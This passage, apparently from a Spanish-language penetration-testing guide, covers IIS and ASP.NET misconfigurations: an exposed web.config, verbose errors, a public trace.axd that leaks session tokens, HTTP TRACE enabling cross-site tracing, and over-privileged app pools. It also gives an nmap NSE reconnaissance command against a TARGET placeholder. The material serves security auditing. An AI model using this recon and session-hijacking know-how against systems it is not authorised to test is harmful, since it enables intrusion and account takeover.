La tercera es la exposición pública del archivo de configuración principal de la aplicación denominado `web.config`. El archivo `web.config` almacena en texto plano las cadenas de conexión a las bases de datos de la empresa (incluyendo direcciones IP, usuarios y contraseñas SQL), las claves de cifrado de estado de vista (MachineKey) y las definiciones de rutas internas.

La cuarta es la presencia de mensajes de error detallados (Verbose Error Messages). Cuando la directiva `<customErrors mode="Off"/>` está configurada en el archivo `web.config`, cualquier fallo de ejecución despliega la pantalla amarilla de error de .NET (Yellow Screen of Death), revelando rutas absolutas de código fuente local (`C:\inetpub\wwwrootpp\`), versiones de frameworks instalados y trazas de pila completas.

La quinta es la exposición del endpoint de depuración `trace.axd`. Cuando el rastreo de ASP.NET está habilitado públicamente (`<trace enabled="true" localOnly="false"/>`), la navegación hacia `http://TARGET/trace.axd` despliega un historial completo de las últimas peticiones HTTP procesadas por el servidor web. Este panel expone las cabeceras HTTP de todos los usuarios conectados, incluyendo sus cookies de sesión NTLM o tokens de autorización Bearer, permitiendo el secuestro inmediato de sesiones activas.

La sexta es la activación del método HTTP `TRACE`, el cual devuelve en el cuerpo de la respuesta la petición exacta enviada por el cliente, facilitando ataques de Cross-Site Tracing (XST) para robar cookies protegidas bajo la bandera `HttpOnly`.

La séptima es la ejecución del pool de aplicaciones (AppPool) bajo identidades con privilegios elevados, como la cuenta `Local System` o un usuario Administrador del Dominio, provocando que cualquier vulnerabilidad de ejecución de código en la aplicación web otorgue acceso total inmediato sobre el servidor o el dominio de Active Directory.

### 4.6 Automatización y Scripts NSE para IIS
El análisis de seguridad en servidores IIS se automatiza eficazmente mediante el motor de scripts de Nmap (NSE). El auditor puede ejecutar escaneos coordinados para detectar la versión precisa, enumerar métodos HTTP, identificar directorios WebDAV y comprobar la vulnerabilidad de nombres cortos 8.3 utilizando la siguiente sintaxis de comando: `nmap -sV --script http-vhosts,http-methods,http-webdav-scan,http-iis-short-name -p 80,443 TARGET`.

Esta ejecución permite correlacionar de manera rápida los hallazgos de reconocimiento, determinando los vectores de ataque más eficientes antes de proceder con las fases de explotación.
